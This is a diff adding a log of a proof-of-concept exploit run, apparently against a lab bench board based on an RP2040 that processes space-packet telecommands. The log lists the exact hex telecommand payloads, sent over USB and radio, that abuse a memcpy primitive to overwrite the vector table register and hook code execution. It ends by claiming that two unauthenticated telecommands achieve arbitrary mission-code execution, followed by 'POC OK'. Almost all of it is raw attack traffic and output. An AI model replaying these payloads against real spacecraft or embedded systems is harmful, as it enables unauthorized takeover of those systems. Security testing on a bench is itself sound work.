@@ -1,0 +1,96 @@
+[   0.000] ========================================================================
+[   0.000] V-14 MEMCPY primitive -> RP2040 RCE
+[   0.000] ========================================================================
+[   1.518] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.892] --> TC apid=0x0A via=usb AES  payload=00
+[   8.944] <-- TM apid=0x0A clear len=3
+[   8.996] --> TC apid=0x1D via=usb clear payload=0101
+[   9.037] <-- TM apid=0x1D clear len=4
+[   9.037] --> TC apid=0x11 via=usb clear payload=00
+[   9.498] <-- TM apid=0x11 clear len=9
+[   9.499] --> TC apid=0x15 via=usb clear payload=001005
+[   9.950] <-- TM apid=0x15 clear len=6
+[   9.950] --> TC apid=0x0D via=usb clear payload=01
+[  10.410] <-- TM apid=0x0D clear len=4
+[  10.452] --> TC apid=0x1D via=usb clear payload=03
+[  10.504] <-- TM apid=0x1D clear len=4
+[  10.504] <-- TM apid=0x09 clear len=9
+[  10.545] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.597] <-- TM apid=0x1D clear len=4
+[  10.597] --> TC apid=0x10 via=usb clear payload=00
+[  10.649] <-- TM apid=0x10 clear len=4
+[  10.649] --> TC apid=0x21 via=usb clear payload=00
+[  11.110] <-- TM apid=0x21 clear len=6
+[  11.110] --> TC apid=0x24 via=usb clear payload=0000
+[  11.151] <-- TM apid=0x24 clear len=8
+[  11.151] --> TC apid=0x24 via=usb clear payload=0100
+[  11.203] <-- TM apid=0x24 clear len=8
+[  11.203] --> TC apid=0x24 via=usb clear payload=0200
+[  11.255] <-- TM apid=0x24 clear len=8
+[  11.255] --> TC apid=0x24 via=usb clear payload=0300
+[  11.306] <-- TM apid=0x24 clear len=8
+[  11.307] --> TC apid=0x25 via=usb clear payload=0080
+[  11.358] <-- TM apid=0x25 clear len=4
+[  11.358] --> TC apid=0x1E via=usb clear payload=01
+[  11.860] <-- TM apid=0x1E clear len=5
+[  11.860] --> TC apid=0x1D via=usb clear payload=0b
+[  11.953] <-- TM apid=0x1D clear len=4
+[  11.953] --> TC apid=0x05 via=usb clear payload=12
+[  12.413] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.915] <-- TM apid=0x1F clear len=4
+[  12.915] --> TC apid=0x1F via=usb clear payload=05
+[  13.426] <-- TM apid=0x1F clear len=4
+[  13.426] --> TC apid=0x0A via=usb clear payload=01
+[  13.471] <-- TM apid=0x0A AES len=3
+[  21.564] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.036] <-- TM apid=0x0E AES len=18
+[  30.036] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.109] --> TC apid=0x1A via=radio AES  payload=4027011000000000000000000000000000000000000000000000000000000000
+[  30.161] <-- TM apid=0x1A clear len=8
+[  30.202] --> TC apid=0x18 via=radio AES  payload=0020002008ed00e00400
+[  30.663] <-- TM apid=0x18 clear len=8
+[  30.663] <-- TM apid=0x18 clear len=12
+[  30.663] MEMCPY log_name->0xe000ed08 ack=0101000052434500
+[  30.756] --> TC apid=0x19 via=radio clear payload=08ed00e00400
+[  31.215] <-- TM apid=0x19 clear len=11
+[  31.215] VTOR now 0x10012740 == labFnSecureLinkOff
+[  31.215] --> TC apid=0x1A via=radio clear payload=4026011000000000000000000000000000000000000000000000000000000000
+[  31.267] <-- TM apid=0x1A clear len=8
+[  31.308] --> TC apid=0x18 via=radio clear payload=0020002008ed00e00400
+[  31.768] <-- TM apid=0x18 clear len=8
+[  31.768] <-- TM apid=0x18 clear len=8
+[  31.768] <-- TM apid=0x18 clear len=8
+[  31.768] <-- TM apid=0x18 clear len=8
+[  31.768] <-- TM apid=0x18 clear len=12
+[  31.768] --> advance(1200 ms)
+[  33.028] <-- TM apid=0x27 clear len=4
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] <-- TM apid=0x01 clear len=64
+[  33.028] --> advance(1000 ms)
+[  34.032] <-- TM apid=0x27 clear len=4
+[  34.032] <-- TM apid=0x27 clear len=4
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] <-- TM apid=0x01 clear len=64
+[  34.032] after second hook: 10 beacons in 1 s -> flood hook ran
+[  34.032] => 2 unauthenticated TCs = arbitrary mission-code execution
+[  34.033] -- console tail: [TC - SPP] APID=0x018 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=19 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x019 SEQ=1 LEN=6 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=45 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01A SEQ=1 LEN=32 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=23 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x018 SEQ=1 LEN=10 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO
+[  34.033] ========================================================================
+[  34.033] POC OK
+[  34.033] ========================================================================
